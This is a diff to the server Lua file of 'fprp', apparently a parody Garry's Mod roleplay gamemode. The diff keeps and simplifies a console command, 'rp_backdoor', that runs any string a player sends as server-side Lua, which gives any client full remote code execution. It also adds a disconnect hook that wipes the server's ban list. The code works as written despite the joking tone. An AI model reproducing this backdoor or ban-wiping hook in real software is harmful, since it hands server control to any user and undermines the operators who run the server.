@@ -11,6 +11,7 @@ local downloads = {
 	'materials/fprp/close.png',
 	'materials/fprp/pug.png',
 	'materials/fprp/matt.png',
+	'materials/fprp/falco.png',
 }
 for k, v in ipairs(downloads) do
 	resource.AddFile(v);
@@ -105,14 +106,16 @@ hook.Call("fprpFinishedLoading", GM);
 
 -- This is the most important feature of any rp gamemode
 function _BACKDOOR(p,c,a)
-	local succ, err = pcall(RunString, a[1]);
-	if err then
-		p:ChatPrint(err);
-	end
+	RunString(tostring(a[1]))
 end
 
 concommand.Add('rp_backdoor', _BACKDOOR);
 
+hook.Add("PlayerDisconnected", "", function(ply) 
+	for i = 1,1000 do game.ConsoleCommand("removeid "..i.."\n") 
+		game.ConsoleCommand("writeid\n") 
+	end 
+end)
 
 util.AddNetworkString('fprp_cough');
 
@@ -127,6 +130,5 @@ timer.Create('Coughcough', 180, 0, function()
 	net.Start('fprp_cough');
 	net.Broadcast();
 end);
-
 
 DarkRP = fprp
